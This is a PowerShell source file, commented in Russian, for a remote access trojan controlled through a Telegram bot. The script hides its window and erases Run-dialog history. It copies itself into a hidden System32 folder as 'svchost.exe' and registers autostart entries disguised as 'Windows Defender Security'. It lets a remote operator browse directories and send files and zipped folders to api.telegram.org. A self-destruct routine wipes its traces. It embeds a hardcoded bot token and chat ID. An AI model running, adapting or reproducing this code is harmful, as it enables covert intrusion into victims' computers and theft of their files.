# RAT через Telegram Bot - РАДИКАЛЬНО ИСПРАВЛЕННАЯ ВЕРСИЯ
$Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
$ChatID = "5674514050"

# Установка кодировки UTF-8 для корректного отображения русских символов
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$PSDefaultParameterValues['*:Encoding'] = 'utf8'

# Настройки скрытности
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.IO.Compression.FileSystem

# Скрытие окна PowerShell
$windowCode = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
$windowAPI = Add-Type -MemberDefinition $windowCode -Name Win32ShowWindowAsync -Namespace Win32Functions -PassThru
$windowAPI::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0) | Out-Null

# Очистка истории RUN при запуске
try {
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
} catch { }

# Функция отправки сообщений с правильной кодировкой
function Send-Telegram {
    param([string]$Message, [string]$FilePath = $null)
    
    $lastMessage = $global:LastSentMessage
    if ($Message -eq $lastMessage) { return }
    $global:LastSentMessage = $Message
    
    $url = "https://api.telegram.org/bot$Token/sendMessage"
    $body = @{
        chat_id = $ChatID
        text = $Message
    }
    
    try {
        $jsonBody = $body | ConvertTo-Json
        $response = Invoke-RestMethod -Uri $url -Method Post -Body $jsonBody -ContentType "application/json; charset=utf-8" -UseBasicParsing
    } catch { 
        try {
            # Альтернативный метод с формой
            $form = @{
                chat_id = $ChatID
                text = $Message
            }
            $response = Invoke-RestMethod -Uri $url -Method Post -Body $form -UseBasicParsing
        } catch { }
    }
    
    if ($FilePath -and (Test-Path $FilePath)) {
        Send-TelegramFile -FilePath $FilePath
    }
}

# Функция отправки файлов
function Send-TelegramFile {
    param([string]$FilePath)
    
    $url = "https://api.telegram.org/bot$Token/sendDocument"
    
    try {
        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        $fileEnc = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
        $boundary = [System.Guid]::NewGuid().ToString()

        $bodyLines = (
            "--$boundary",
            "Content-Disposition: form-data; name=`"chat_id`"",
            "",
            $ChatID,
            "--$boundary",
            "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $FilePath -Leaf)`"",
            "Content-Type: application/octet-stream",
            "",
            $fileEnc,
            "--$boundary--"
        ) -join "`r`n"

        Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines -UseBasicParsing
    } catch {
        try {
            # Резервный метод отправки файла
            $fileInfo = Get-Item $FilePath
            $fileStream = [System.IO.File]::OpenRead($FilePath)
            $form = @{
                chat_id = $ChatID
                document = $fileStream
            }
            Invoke-RestMethod -Uri $url -Method Post -Form $form -UseBasicParsing
            $fileStream.Close()
        } catch { }
    }
}

# Функция создания ZIP архива
function Compress-Folder {
    param([string]$FolderPath, [string]$ZipPath)
    
    try {
        [System.IO.Compression.ZipFile]::CreateFromDirectory($FolderPath, $ZipPath, [System.IO.Compression.CompressionLevel]::Fastest, $false)
        return $true
    } catch {
        try {
            # Резервный метод архивации через COM
            $shell = New-Object -ComObject Shell.Application
            $zipFolder = $shell.NameSpace($ZipPath)
            $sourceFolder = $shell.NameSpace($FolderPath)
            $zipFolder.CopyHere($sourceFolder.Items())
            Start-Sleep -Seconds 3
            return $true
        } catch {
            return $false
        }
    }
}

# РАДИКАЛЬНОЕ ИСПРАВЛЕНИЕ: Полностью переписанная система инициализации
function Initialize-RAT {
    # Уникальная установка в автозагрузку - скрытая папка в System32 с рандомным именем
    $hiddenFolder = "$env:WINDIR\System32\Microsoft.NET\Framework64\v4.0.30319\Config"
    if (!(Test-Path $hiddenFolder)) { 
        New-Item -Path $hiddenFolder -ItemType Directory -Force | Out-Null
        # Скрываем папку системным атрибутом
        attrib +s +h "$hiddenFolder" 2>&1 | Out-Null
    }
    $scriptPath = "$hiddenFolder\svchost.exe"

    # Копируем скрипт в скрытое место только если его там нет
    if (!(Test-Path $scriptPath)) {
        $scriptContent = Get-Content -Path $MyInvocation.MyCommand.Path -Raw
        $scriptContent | Out-File -FilePath $scriptPath -Encoding UTF8
    }

    # Установка в несколько мест автозагрузки для надежности
    $regPaths = @(
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"
    )

    foreach ($regPath in $regPaths) {
        try {
            if (!(Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
            Set-ItemProperty -Path $regPath -Name "Windows Defender Security" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force -ErrorAction SilentlyContinue
        } catch { }
    }
    
    return $scriptPath
}

# Основные переменные
$currentDir = "C:\"
$global:LastSentMessage = ""
$global:LastUpdateId = 0

# РАДИКАЛЬНОЕ ИСПРАВЛЕНИЕ: Полностью отделяем инициализацию от основного кода
$isInitialized = $false

function Start-RATMainLoop {
    # Отправка информации о запуске
    Send-Telegram "RAT активирован на $env:COMPUTERNAME
Доступные команды:
/help - список команд
/ls - список файлов
/cd [папка] - сменить директорию
/download [файл] - скачать файл
/selfdestruct - самоуничтожение"

    # Основной цикл опроса
    while ($true) {
        try {
            $offset = if ($global:LastUpdateId) { $global:LastUpdateId + 1 } else { 0 }
            $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/getUpdates?offset=$offset&timeout=60" -Method Get -UseBasicParsing
            
            if ($updates.ok -and $updates.result.Count -gt 0) {
                foreach ($update in $updates.result) {
                    $global:LastUpdateId = $update.update_id
                    
                    if ($update.message.chat.id -eq $ChatID) {
                        $command = $update.message.text
                        
                        # Обработка команд
                        switch -regex ($command) {
                            "^/help$" {
                                Send-Telegram "Доступные команды:
/help - показать это сообщение
/ls - список файлов в текущей директории
/cd [папка] - сменить директорию
/download [файл] - скачать файл или папку
/selfdestruct - самоуничтожение RAT"
                            }
                            "^/ls$" {
                                $items = Get-ChildItem -Path $currentDir -Force
                                $fileList = @()
                                foreach ($item in $items) {
                                    $type = if ($item.PSIsContainer) { "📁" } else { "📄" }
                                    $size = if (!$item.PSIsContainer -and $item.Length) { " ($([math]::Round($item.Length/1KB,2)) KB)" } else { "" }
                                    $fileList += "$type $($item.Name)$size"
                                }
                                Send-Telegram "Содержимое $currentDir
$($fileList -join "`n")"
                            }
                            "^/cd (.+)$" {
                                $newDir = $matches[1].Trim()
                                if ($newDir -eq "..") {
                                    $currentDir = Split-Path $currentDir -Parent
                                    if (!$currentDir) { $currentDir = "C:\" }
                                } else {
                                    $testPath = Join-Path $currentDir $newDir
                                    if (Test-Path $testPath -PathType Container) {
                                        $currentDir = $testPath
                                    } else {
                                        Send-Telegram "Директория не найдена: $newDir"
                                        continue
                                    }
                                }
                                
                                # Отправляем содержимое новой директории с помощью /ls
                                $items = Get-ChildItem -Path $currentDir -Force
                                $fileList = @()
                                foreach ($item in $items) {
                                    $type = if ($item.PSIsContainer) { "📁" } else { "📄" }
                                    $size = if (!$item.PSIsContainer -and $item.Length) { " ($([math]::Round($item.Length/1KB,2)) KB)" } else { "" }
                                    $fileList += "$type $($item.Name)$size"
                                }
                                Send-Telegram "/ls $currentDir
$($fileList -join "`n")"
                            }
                            "^/download (.+)$" {
                                $target = $matches[1].Trim()
                                $fullPath = Join-Path $currentDir $target
                                
                                if (Test-Path $fullPath) {
                                    if (Test-Path $fullPath -PathType Container) {
                                        # Архивируем папку
                                        $zipPath = "$env:TEMP\$([System.IO.Path]::GetRandomFileName()).zip"
                                        if (Compress-Folder -FolderPath $fullPath -ZipPath $zipPath) {
                                            Send-Telegram "Папка $target заархивирована" $zipPath
                                            Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
                                        } else {
                                            Send-Telegram "Ошибка архивации папки: $target"
                                        }
                                    } else {
                                        Send-Telegram "Файл $target отправлен" $fullPath
                                    }
                                } else {
                                    Send-Telegram "Файл/папка не найдены: $target"
                                }
                            }
                            "^/selfdestruct$" {
                                Send-Telegram "🔄 Запуск процедуры самоуничтожения..."
                                
                                try {
                                    # Создаем скрипт очистки напрямую в коде
                                    $cleanupScript = @"
# cleanup.ps1 - Скрипт полной очистки RAT
`$Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
`$ChatID = "5674514050"

function Send-Telegram {
    param([string]`$Message)
    
    `$url = "https://api.telegram.org/bot`$Token/sendMessage"
    `$body = @{
        chat_id = `$ChatID
        text = `$Message
    }
    
    try {
        Invoke-RestMethod -Uri `$url -Method Post -Body `$body -UseBasicParsing | Out-Null
    } catch { }
}

Send-Telegram "🔍 Начинается полная очистка RAT..."

# 1. Завершаем все процессы RAT
Send-Telegram "🔄 Этап 1: Завершение процессов RAT"

`$processes = Get-Process | Where-Object {
    `$_.ProcessName -eq "powershell" -or 
    `$_.ProcessName -eq "pwsh"
}

foreach (`$process in `$processes) {
    try {
        `$cmdLine = (Get-WmiObject Win32_Process -Filter "ProcessId = `$(`$process.Id)").CommandLine
        if (`$cmdLine -like "*svchost.exe*" -or `$cmdLine -like "*Windows Defender Security*") {
            Stop-Process -Id `$process.Id -Force -ErrorAction SilentlyContinue
        }
    } catch { }
}

# 2. Удаляем файлы RAT
Send-Telegram "🔄 Этап 2: Удаление файлов RAT"

`$filesToDelete = @(
    "$env:WINDIR\System32\Microsoft.NET\Framework64\v4.0.30319\Config\svchost.exe",
    "$env:TEMP\WindowsSystem.exe"
)

`$deletedFiles = @()
foreach (`$filePattern in `$filesToDelete) {
    try {
        Get-ChildItem -Path `$filePattern -ErrorAction SilentlyContinue | ForEach-Object {
            Remove-Item `$_.FullName -Force -ErrorAction SilentlyContinue
            `$deletedFiles += `$_.FullName
        }
    } catch { }
}

# 3. Очищаем автозагрузку реестра
Send-Telegram "🔄 Этап 3: Очистка реестра"

`$regPaths = @(
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce", 
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"
)

`$regEntries = @()
foreach (`$regPath in `$regPaths) {
    try {
        Remove-ItemProperty -Path `$regPath -Name "Windows Defender Security" -Force -ErrorAction SilentlyContinue
        `$regEntries += "`$regPath\Windows Defender Security"
    } catch { }
}

# 4. Очищаем историю RUN
Send-Telegram "🔄 Этап 4: Очистка истории RUN"
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue

# 5. Финальный отчет
`$report = @"
✅ ОЧИСТКА RAT ЗАВЕРШЕНА

Удаленные файлы:
`$(`$deletedFiles -join "`n")

Удаленные записи реестра:
`$(`$regEntries -join "`n")

Все следы RAT успешно удалены.
"@

Send-Telegram `$report
"@

                                    # Сохраняем скрипт очистки
                                    $cleanupPath = "$env:TEMP\cleanup_$(Get-Random).ps1"
                                    $cleanupScript | Out-File -FilePath $cleanupPath -Encoding UTF8
                                    
                                    # Запускаем скрипт очистки в отдельном процессе
                                    $processInfo = New-Object System.Diagnostics.ProcessStartInfo
                                    $processInfo.FileName = "powershell.exe"
                                    $processInfo.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$cleanupPath`""
                                    $processInfo.CreateNoWindow = $true
                                    $processInfo.UseShellExecute = $false
                                    
                                    $process = [System.Diagnostics.Process]::Start($processInfo)
                                    
                                    # Даем время на запуск cleanup скрипта
                                    Start-Sleep -Seconds 3
                                    
                                    # Завершаем текущий процесс RAT
                                    Stop-Process -Id $pid -Force
                                    
                                } catch {
                                    Send-Telegram "❌ Ошибка при самоуничтожении: $($_.Exception.Message)"
                                    
                                    # Аварийная очистка
                                    try {
                                        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
                                        $regPaths = @(
                                            "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
                                            "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
                                            "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                                            "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"
                                        )
                                        foreach ($regPath in $regPaths) {
                                            Remove-ItemProperty -Path $regPath -Name "Windows Defender Security" -Force -ErrorAction SilentlyContinue
                                        }
                                        Stop-Process -Id $pid -Force
                                    } catch {
                                        cmd /c "taskkill /f /pid $pid" 2>&1 | Out-Null
                                    }
                                }
                            }
                        }
                    }
                }
            }
        } catch { 
            Start-Sleep -Seconds 5
        }
    }
}

# РАДИКАЛЬНОЕ ИСПРАВЛЕНИЕ: Разделяем инициализацию и основной цикл
# Сначала выполняем инициализацию
$scriptPath = Initialize-RAT

# Затем проверяем - если это первый запуск, то запускаем основной цикл
# Если это копия скрипта из скрытой папки, то тоже запускаем основной цикл
if ($MyInvocation.MyCommand.Path -eq $scriptPath -or !$isInitialized) {
    $isInitialized = $true
    Start-RATMainLoop
}
